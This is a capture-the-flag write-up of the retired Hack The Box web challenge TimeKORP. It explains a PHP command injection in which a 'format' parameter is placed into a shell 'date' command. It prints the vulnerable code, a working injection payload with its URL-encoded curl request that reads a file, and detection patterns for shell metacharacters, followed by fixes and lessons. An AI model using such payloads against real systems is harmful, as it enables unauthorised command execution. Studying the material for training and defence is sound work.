---
challenge: TimeKORP
category: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, command-injection, php, cyber-apocalypse-2024]
---

# TimeKORP — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (Cyber Apocalypse 2024). Methodology notes; no real flags.

## TL;DR

A web app renders the time from a `format` parameter. In PHP the controller hands that value to a model that builds a **shell command** with `date` without sanitising it; the value sits inside single quotes, so you close the quote, chain with `|` and comment out the rest. The challenge ships the source, so the injection is two lines away.

## Brief and surface

- Web category. The challenge provides the source (`TimeController.php`, `TimeModel.php`) and a `Dockerfile`; the instance serves a single page showing the time.
- The `Dockerfile` copies the flag to `/flag`: the goal is reading a file, not escalating.

## Recon

```bash
curl -s "http://<IP>:<PORT>/"
# 14:32:07
curl -s "http://<IP>:<PORT>/?format=H"
# 14
```

The `format` parameter changes the output, which means it is passed straight to `date`.

## Code analysis

```php
// TimeModel.php
$this->command = "date '" . $this->format . "' 2>&1";
// ...
return shell_exec($this->command);
```

The value lands between **single quotes** inside a shell command. No `escapeshellarg`, no allowlist: any shell metacharacter is interpreted.

## Exploitation

Close the quote, chain with `|` and comment out `2>&1` with `#`:

```text
/?format=%H:%M:%S' |cat /flag #
```

```bash
curl -s "http://<IP>:<PORT>/?format=%H%3A%M%3A%S%27%20%7Ccat%20%2Fflag%20%23"
```

The `#` is not cosmetic: without it `2>&1` stays in the command and `cat`'s output is redirected, so the flag never shows.

## Evidence

- Web instance and the challenge's PHP source; in the writeup, the constructed command (`date '%H:%M:%S'' |cat /flag # 2>&1`), never the flag.

## Lessons

- Interpolating user input into a shell command is command injection even for "just" a date format.
- Inside single quotes the attack is `'` plus a separator, not a bare `;`; the trailing `#` avoids the redirection.
- URL-encode (`%27`, `%7C`, `%23`, `%20`) when using `curl`.
- `escapeshellarg()` and an allowlist of formats are the fix; better still, use the language's date API and skip the shell.

## Detection and mitigation

- Never build shell commands: use `DateTime::format()` in PHP, which executes nothing.
- If a binary is unavoidable, `escapeshellarg` plus a `format` allowlist (`^[a-zA-Z0-9:%-]+$`).
- Detection: `format` values containing quotes, `|`, `;`, `$(` or `#`, and `sh -c date ...` processes with `cat` on the command line.
